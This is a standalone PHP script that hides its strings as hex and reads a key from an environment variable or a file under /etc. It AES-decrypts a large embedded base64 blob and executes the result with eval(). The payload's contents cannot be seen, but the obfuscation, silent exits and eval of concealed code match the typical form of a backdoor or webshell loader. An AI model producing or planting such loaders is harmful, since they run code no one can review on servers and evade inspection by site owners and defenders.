<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('xR3vMAvx5xZxGhrgKvplcA==');

$c=base64_decode(

'UUQo07ZeQDOWSvKC2hxUV9ShCRMsQ7Pbcmx+TaUYJCdXPWCnQr5+bCJz5EXL0Tiy5LC7qrXaLgbm' .
'Mh5v1q52vVdQFZr5Qbafp7yepgKtwvkPOi/HAMOg2zYZllluTcuSlZnn71mJ0wbA24RxjIvf+EaW' .
'MbRS+L5fl8dSYz4jOPkK9lPA3f0oiwX4jRFy3YzQMSxfnzRgLVeCpzzLplov/fjQZiWj5cJhfPRL' .
'ska3zOops/xoZ60LqnGRECVzH6X8slgjrITjRu6uX0uI2pq1jRtERqPs7KJ6jUHrOHFBI0HJsZLP' .
'464RF50kGWjT5N3MZcGISZeO4Kc0bM7ryB/eHAjYH0JznBV6UR3fVLC5gMDSvkL9iGcvOX/9ALg3' .
'ozb1e+aE2PHk3YjwaCJUpfO9SLqZRXR+Qh1UXFBo+8IGX1YxWUBMh2IJLu7d50GiqfkpxIRnnJtU' .
'OxZWV5NkkyXPl+uyEopEMU4DIA2mzaQmWp7ZRTb8p5mbbXa/B3myhHbTYnNCYBAlwSH/sNBcZe+6' .
'pqSpW13fi5doC09KcNQgYU/zvxQYcDoQwcEqLCR/6S+m8czVe5uX+sD4OfCnbR+PVa4CjHaEFz3/' .
'idZbSCOEr1H/fIN6VQLCUs7mfjWCTsGcLzHDhPWqrCu0fxKlwARNXKu7N7TVk3Vyhejz7YxNzvgH' .
'Y88HMEDG5F/Hn1lEGzWF80pAXazHxJ80XvtZHlpZXoNHDWtO63g6KnaWJhVjFWDtqPDpyNwzA4ia' .
'fPf3RPQ3J01NLdnOpB0shkqvirTjnPcS4Q0GYektRLIW9JgIjMrXW1p09O4ZAEftjs7loWp7FXFF' .
'vGAK1+x2yB0nW427svyFnv9FqwX4MOAeSUUJw0xxMTi4UwXTbTTYiv1T87hotiCtptbHVvyD1AxA' .
'W1WO1l058KLCPtHN9xyDb6bQTUmS7RrtUMMBYvQGIEcrRP+SlgsFku7ln/TY8nOX3ROAxCII2y96' .
'jwgaVHpNNJ/USQ0NJ9dxD0OdHNWlcZdXx4SJEZejhNozKzkKt8cvNqGXg6Yu8BJzgyM//WrTCcBR' .
'm3r9tGz4HLm5oQ0VssrhSNs/RpptOYGaJq1ZRqIbrchCdhvg0YoyvX+Z2nv4Qh8GUvruDgUM7CFv' .
'ZwIU5kfRALR1dn2jlfovYEirLHtipxYNZXVyCBdXTW5ORMzZsJx+buYvf8YsKEwP9zVhYcLbz8mC' .
'Va0RlZdj+RlpUfsMFYyGYf7KY8JGNdKacM047xdGXdqvT1JDs2wEtx3GWs2d/qHnis5Gz5J4aPbI' .
'219FCJbI2SBNtOX9hVPofh/4Aoq568/BIFJNZYH9KTdk24/nEXtQkGhFfcWo9O5ip77TnVU4XQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

